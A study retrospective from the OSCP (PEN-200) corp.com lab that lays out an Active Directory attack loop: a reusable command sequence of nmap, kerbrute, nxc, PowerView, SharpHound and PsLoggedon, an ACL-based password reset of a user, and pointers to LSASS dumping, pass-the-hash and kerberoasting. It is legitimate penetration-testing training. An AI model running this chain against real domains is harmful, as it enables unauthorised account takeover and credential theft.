title: Hacktrack Retrospective — Six Lessons on the AD Enumeration Loop
body:
Hacktrack was the PEN-200 corp.com lab — the canonical assumed-breach AD chain. The techniques (PowerView, BloodHound, ForceChangePassword via ACL) are well-documented elsewhere. What this retrospective captures is the *meta-pattern*: AD compromise is not a linear chain. It's a loop.

Final proof: Domain Admin via Stephanie → Robert ForceChangePassword chain.

— THE CHAIN — IN ORDER —

  1. Unauthenticated nmap sweep → identified DC1 (192.168.x.70) by Kerberos port 88 + LDAP banner 'Domain: corp.com'
  2. nxc smb null sweep → all member servers ACCESS_DENIED, DC returned false positive (expected)
  3. enum4linux-ng → confirmed Domain SID, no users via RPC (expected on hardened DC)
  4. kerbrute userenum with xato-net wordlist → got dave, jeff, pete, jen, stephanie, administrator
  5. Lab provided creds for dave (assumed breach) → pivoted to authenticated enum
  6. PowerView Get-DomainUser / Get-DomainGroup / Get-DomainGroupMember → mapped users, groups, Domain Admins
  7. PowerView Find-InterestingDomainAcl | Out-GridView → spotted Stephanie has GenericAll over Management Department
  8. SharpHound.exe → BloodHound graph confirmed and revealed: Stephanie also has local admin on CLIENT74
  9. PsLoggedon → jeffadmin (Domain Admin) currently logged into CLIENT74
  10. NEW credential in lab (Capstone) → re-ran enum → Stephanie now has GenericAll over user Robert
  11. PowerView Set-DomainUserPassword on Robert → DA shell via cred reuse

— LESSONS —

ENUMERATION IS NOT A PHASE — IT'S A LOOP:
  Every new credential triggers a full re-enumeration pass. The graph changes
  the moment you authenticate as a different user because PowerView/BloodHound
  queries reflect what THAT user can see. Same domain, different lens.
  Skipping the re-enum step is the #1 reason students miss escalation paths.
  The Capstone exercise rewards exactly this — Stephanie's ACL over Robert
  was NOT visible from dave's perspective, only from Stephanie's.

KERBRUTE IS WORTH THE SETUP TIME EVEN WHEN YOU HAVE CREDS:
  Lab gave us dave's creds; we still ran kerbrute first. Three reasons:
  (1) confirms which usernames are real targets for spraying later,
  (2) catches accounts with disabled pre-auth (AS-REP roastable),
  (3) builds the full user inventory before BloodHound runs — useful when
  comparing PowerView output to actual domain state. The 90 seconds spent
  on kerbrute saves the 'wait, who is iis_service?' confusion later.

FIND-INTERESTINGDOMAINACL → OUT-GRIDVIEW IS THE EXAM-DAY MOVE:
  PowerView's Find-InterestingDomainAcl returns hundreds of ACL entries.
  Reading them in console output is brutal. Out-GridView gives you a sortable,
  filterable spreadsheet inside PowerShell. Sort by IdentityReferenceName,
  filter to your current user, look at ObjectAceType. The interesting columns:
  ObjectDN (what), ActiveDirectoryRights (how much access), IdentityReferenceName (who).
  This trick alone is worth memorizing for the exam.

BLOODHOUND IS A CONFIRMATION TOOL, NOT A DISCOVERY TOOL — INITIALLY:
  PowerView found Stephanie's GenericAll over Management Department before
  SharpHound finished collecting. BloodHound is unbeatable for visualizing
  multi-hop paths and finding non-obvious chains (kerberoastable services,
  RBCD chains, ESC vectors). But for the first 'who can do what to whom'
  pass, PowerView's targeted queries are faster. Run SharpHound in the
  background; analyze the results when they're ready, don't wait.

PSLOGGEDON IS UNDERRATED:
  Knowing WHERE a Domain Admin is currently logged in changes the entire
  attack strategy. PsLoggedon (from Sysinternals) tells you in 10 seconds.
  jeffadmin on CLIENT74 + Stephanie has local admin on CLIENT74 = clear
  escalation path: compromise Stephanie → log into CLIENT74 → dump LSASS →
  jeffadmin's TGT or NTLM hash → Domain Admin. The interactive sessions
  on a workstation ARE the credentials waiting to be stolen.

FORCECHANGEPASSWORD IS A GIFT — USE IT LAST:
  ACLs that grant ForceChangePassword (a subset of GenericAll/GenericWrite)
  let you reset a target user's password without knowing their current one.
  Powerful but LOUD — the user will notice they can't log in. On a lab
  Capstone, fine. On a real engagement, consider quieter primitives first:
  Targeted Kerberoast (set an SPN, kerberoast, crack), AS-REP roast targeting
  (clear DONT_REQUIRE_PREAUTH flag on the target). Same access, no broken
  account. The mindmap at thehacker.recipes/ad/movement/dacl has the
  full primitive list.

— THE LOOP, FORMALIZED —

  while not domain_admin:
      1. enumerate as current user (Get-Domain*, BloodHound)
      2. identify path (ACL, local admin, kerberoast, AS-REP, SPN)
      3. execute path → new credential or new session
      4. swap context to new identity
      5. goto 1

  Most students stop at step 2 with the first user they get. The Capstone
  proved you must always do step 5.
cmd:
# ── REUSABLE HACKTRACK-PATTERN CHAIN ───────────────────

# Stage 0 — environment setup (do this ONCE per box)
export dc_ip=192.168.x.70
export domain=corp.com
echo "$dc_ip $domain DC1.$domain dc1" | sudo tee -a /etc/hosts

# Stage 1 — unauthenticated discovery (see ad_unauth_enum)
sudo nmap -sn 192.168.x.0/24 -oG - | awk '/Up$/{print $2}' > live_hosts.txt
sudo nmap -sV -sC -iL live_hosts.txt -p88,389,445,3389,5985
# Look for port 88 + LDAP banner = DC. Note domain name from LDAP banner.

# Stage 2 — username enumeration
kerbrute userenum --dc $dc_ip -d $domain \
  /usr/share/seclists/Usernames/Names/names.txt -o valid_users.txt

# Stage 3 — first cred (provided or via spray/AS-REP roast)
nxc smb $dc_ip -u dave -p 'Flowers1' --pass-pol     # always grab the lockout policy

# Stage 4 — authenticated PowerView enumeration FROM WINDOWS
# (from CLIENT75 or any domain-joined box, with PowerView loaded)
Get-Domain                                          # forest, DCs, modes
Get-DomainUser | select name,samaccountname,description,memberof
Get-DomainGroup | select cn,description
Get-DomainGroupMember 'Domain Admins' | select MemberName
Get-DomainUser -SPN                                 # kerberoastable accounts
Get-DomainUser -PreauthNotRequired                  # AS-REP roastable
Get-DomainComputer | Resolve-IPAddress              # all hosts
Find-InterestingDomainAcl | Out-GridView            # ACL gold mine

# Stage 5 — BloodHound collection in parallel
.\SharpHound.exe -c All -d $domain --zipfilename loot.zip
# Transfer loot.zip to Kali, drag into BloodHound UI
# Pre-built queries:
#   - Shortest path from owned principals to Domain Admins
#   - Kerberoastable users
#   - AS-REP roastable users
#   - Users with foreign group membership

# Stage 6 — find logged-on Domain Admins (the gold)
.\PsLoggedon.exe \\client74                         # check each box where you have access
# If a DA is logged on a box you can reach as admin → LSASS dump → credentials

# Stage 7 — execute the chain (varies — common patterns)
# A) ACL abuse: Set-DomainUserPassword via ForceChangePassword
#    $newpw = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
#    Set-DomainUserPassword -Identity robert -AccountPassword $newpw
#
# B) Local admin on box with DA session: dump LSASS, get DA hash, PTH to DC
#    (see mimikatz / pth / dcsync nodes)
#
# C) Kerberoast service account, crack with Hashcat, PTH/login
#    (see kerberoast node)

# Stage 8 — RE-ENUMERATE as the new identity (THIS IS THE LOOP)
# Drop the old PowerShell session. Start fresh as the new user.
# Run Stage 4 commands again. The ACL graph WILL look different.

# ── TIME BUDGET ─────────────────────────────────────────
# Unauth recon:           10-15 min
# Kerbrute userenum:      5 min
# First authenticated pass (PowerView):  15-20 min
# BloodHound collection + analysis:      20-30 min
# Chain execution per step:              10-30 min
# Re-enum after each step:               10 min (don't skip!)
#
# Typical AD lab compromise: 90-150 min if you stay in the loop.
# If you're past 3 hours, you've probably skipped re-enum after a foothold change.
warn: The single most common failure mode on AD labs is treating enumeration as a one-time setup phase. Every credential change is a new enumeration job. The graph you saw as dave is NOT the graph stephanie sees. Run Get-DomainUser/Get-DomainGroupMember/Find-InterestingDomainAcl every single time you swap user context. The 10 minutes of re-enumeration saves 2 hours of wandering.

choices.label: Apply the AD enum loop on a new box
